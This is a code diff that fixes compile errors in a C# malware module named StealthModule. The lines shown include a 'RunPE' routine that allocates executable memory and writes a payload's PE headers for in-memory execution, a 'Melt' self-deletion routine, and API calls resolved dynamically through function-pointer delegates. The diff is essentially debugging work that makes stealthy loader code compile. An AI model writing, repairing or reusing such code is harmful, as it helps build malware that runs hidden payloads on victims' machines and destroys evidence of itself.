@@ -1,4 +1,5 @@
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -25,7 +26,7 @@ namespace StealthModule
         private const uint DELETE = 0x00010000;
         private const uint FILE_SHARE_DELETE = 0x00000004;
         private const uint OPEN_EXISTING = 3;
-        private const int FILE_DISPOSITION_INFO = 4;
+        private const int FileDispositionInfo = 4;
         private const uint PAGE_EXECUTE_READWRITE = 0x40;
         private const uint MEM_COMMIT = 0x00001000;
         private const uint MEM_RESERVE = 0x00002000;
@@ -136,7 +137,7 @@ namespace StealthModule
                     return null;
 
                 var del = Marshal.GetDelegateForFunctionPointer(pFunc, typeof(T)) as T;
-                _delegateCache[key] = del;
+                _delegateCache[key] = del as Delegate;
                 return del;
             }
 
@@ -464,8 +465,7 @@ namespace StealthModule
                     return false;
                 }
 
-                    Log(string.Format("[RunPE] Allocated memory at 0x{0:X}", (long)newBase));
-                }
+                     Log(string.Format("[RunPE] Allocated memory at 0x{0:X}", (long)newBase));
 
                 // Write headers
                 uint headerSize = (uint)BitConverter.ToInt32(payload, e_lfanew + 0x54);
@@ -556,7 +556,7 @@ namespace StealthModule
                 if (hFile != (IntPtr)(-1) && hFile != IntPtr.Zero)
                 {
                     FILE_DISPOSITION_INFO info = new FILE_DISPOSITION_INFO { DeleteFile = true };
-                    if (SetFileInformationByHandle != null) SetFileInformationByHandle(hFile, FILE_DISPOSITION_INFO, ref info,
+                    if (SetFileInformationByHandle != null) SetFileInformationByHandle(hFile, FileDispositionInfo, ref info,
                         (uint)Marshal.SizeOf(info));
                     if (CloseHandle != null) CloseHandle(hFile);
                     Log("[Melt] Success");
